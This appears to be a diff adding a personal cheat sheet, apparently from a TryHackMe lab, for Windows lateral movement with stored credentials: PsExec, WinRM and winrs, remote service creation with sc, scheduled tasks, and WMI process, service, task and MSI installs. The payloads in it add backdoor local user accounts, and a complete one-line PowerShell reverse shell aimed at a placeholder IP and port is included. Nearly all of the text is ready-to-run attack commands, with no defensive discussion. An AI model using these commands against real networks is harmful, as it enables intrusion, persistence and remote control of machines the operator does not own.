@@ -1,0 +1,131 @@
+# Psexec
+    Ports: 445/TCP (SMB)
+    Required Group Memberships: Administrators
+
+    psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
+
+
+# Remote Process Creation Using WinRM
+    Ports: 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+    Required Group Memberships: Remote Management Users
+
+    # with binary
+    winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
+
+    # with powershell
+    $username = 'Administrator';
+    $password = 'Mypass123';
+    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+    Enter-PSSession -Computername TARGET -Credential $credential
+
+    Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
+
+
+# Remotely Creating Services Using sc
+    Ports:
+        135/TCP, 49152-65535/TCP (DCE/RPC)
+        445/TCP (RPC over SMB Named Pipes)
+        139/TCP (RPC over SMB Named Pipes)
+    Required Group Memberships: Administrators
+
+    sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
+    sc.exe \\TARGET start THMservice
+    # create local user etc...
+    sc.exe \\TARGET stop THMservice
+    sc.exe \\TARGET delete THMservice
+
+
+# Creating Scheduled Tasks Remotely
+    schtasks /s TARGET /RU "SYSTEM" /create /tn "<SC_NAME>" /tr "<command/payload to
+    execute>" /sc ONCE /sd 01/01/1970 /st 00:00
+    schtasks /s TARGET /run /TN "<SC_NAME>"
+    # delete task finaly
+    schtasks /S TARGET /TN "<SC_NAME>" /DELETE /F
+
+
+# Tweeks - one-string reverse shell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+# WMI
+
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+## Invoke command with WMI
+## Requirements
+'''
+    Ports:
+    135/TCP, 49152-65535/TCP (DCERPC)
+    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+    Required Group Memberships: Administrators
+'''
+
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+
+# Create service with WMI
+## Requirements
+'''
+    Ports:
+    135/TCP, 49152-65535/TCP (DCERPC)
+    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+    Required Group Memberships: Administrators
+'''
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "WMISvc64";
+DisplayName = "WMISvc64";
+PathName = "net user munra2 Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'WMISvc64'"
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+
+## Stop and delete created service
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+
+# Creating Scheduled Tasks Remotely with WMI
+## Requirements
+'''
+    Ports:
+    135/TCP, 49152-65535/TCP (DCERPC)
+    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+    Required Group Memberships: Administrators
+'''
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "BGClnPrc64"
+Start-ScheduledTask -CimSession $Session -TaskName "BGClnPrc64"
+
+# Delete schedule
+Unregister-ScheduledTask -CimSession $Session -TaskName "BGClnPrc64"
+
+
+## Installing MSI packages through WMI
+## Requirements
+'''
+    Ports:
+    135/TCP, 49152-65535/TCP (DCERPC)
+    5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+    Required Group Memberships: Administrators
+'''
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+
